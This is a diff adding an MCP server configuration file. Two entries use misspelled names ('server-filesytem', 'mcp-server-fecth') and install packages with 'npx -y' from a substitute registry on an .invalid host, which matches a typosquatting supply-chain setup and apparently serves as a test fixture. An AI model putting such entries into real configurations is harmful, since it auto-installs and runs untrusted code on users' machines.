@@ -1,0 +1,15 @@
+{
+  "mcpServers": {
+    "filesystem": {
+      "command": "npx",
+      "args": ["-y", "--registry", "https://registry.invalid/", "@modelcontextprotocol/server-filesytem@0.6.2"]
+    },
+    "mcp-server-fecth": {
+      "url": "https://mcp.example.invalid/mcp"
+    },
+    "memory": {
+      "command": "npx",
+      "args": ["-y", "--registry", "https://registry.invalid/", "@modelcontextprotocol/server-memory@2025.4.25"]
+    }
+  }
+}
